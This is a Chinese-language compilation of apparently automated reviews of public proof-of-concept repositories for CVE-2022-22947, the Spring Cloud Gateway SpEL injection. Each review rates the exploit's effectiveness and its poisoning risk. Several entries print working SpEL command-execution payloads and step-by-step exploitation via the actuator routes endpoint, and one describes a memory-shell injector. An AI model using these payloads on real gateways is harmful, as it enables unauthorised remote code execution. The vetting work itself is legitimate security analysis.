1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

